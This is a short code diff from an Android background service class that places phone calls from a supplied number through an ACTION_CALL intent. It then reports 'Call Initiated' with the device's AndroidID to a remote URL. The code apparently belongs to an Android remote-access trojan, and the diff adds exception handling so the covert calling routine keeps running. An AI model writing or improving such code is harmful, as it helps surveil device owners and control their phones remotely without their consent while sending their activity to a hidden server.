@@ -1163,8 +1163,12 @@ public class MyService extends Service
 	    	 String telephone = "tel:" + i.trim() ;
 	    	 Intent intent = new Intent(Intent.ACTION_CALL);
 	    	 intent.setData(Uri.parse(telephone));
-	     	 intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
-	    	 startActivity(intent);
+			 intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+	    	 try {
+				 startActivity(intent);
+			 }catch(SecurityException e ){
+				 e.printStackTrace();
+			 }
         	
 	        try {
 				getInputStreamFromUrl(URL + PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("urlPost", "") + "UID=" + PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("AndroidID", "") + "&Data=", "Call Initiated: " + i);
